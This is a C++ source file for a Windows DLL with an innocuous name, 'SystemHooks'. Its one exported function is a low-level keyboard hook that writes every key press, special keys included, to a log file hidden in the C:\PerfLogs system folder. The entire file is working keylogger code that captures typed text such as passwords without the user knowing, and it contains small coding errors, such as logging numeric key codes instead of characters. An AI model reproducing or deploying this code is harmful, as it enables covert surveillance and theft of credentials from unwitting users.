// SystemHooks.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "dllmain.hpp"

constexpr wchar_t* KEYS_FILE_PATH = L"C:\\PerfLogs\\keys.log";

__declspec(dllexport) LRESULT CALLBACK __cdecl KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	File keys_file{ KEYS_FILE_PATH };

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	// If key is being pressed
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {

			// Invisible keys
		case VK_CAPITAL:	keys_file.write(L"<CAPLOCK>");		break;
		case VK_SHIFT:		keys_file.write(L"<SHIFT>");		break;
		case VK_LCONTROL:	keys_file.write(L"<LCTRL>");		break;
		case VK_RCONTROL:	keys_file.write(L"<RCTRL>");		break;
		case VK_INSERT:		keys_file.write(L"<INSERT>");		break;
		case VK_END:		keys_file.write(L"<END>");			break;
		case VK_PRINT:		keys_file.write(L"<PRINT>");		break;
		case VK_DELETE:		keys_file.write(L"<DEL>");			break;
		case VK_BACK:		keys_file.write(L"<BK>");			break;

		case VK_LEFT:		keys_file.write(L"<LEFT>");			break;
		case VK_RIGHT:		keys_file.write(L"<RIGHT>");		break;
		case VK_UP:			keys_file.write(L"<UP>");			break;
		case VK_DOWN:		keys_file.write(L"<DOWN>");			break;

			// Visible keys
		default:
			keys_file.write(std::to_wstring((wchar_t)tolower(p->vkCode)));

		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}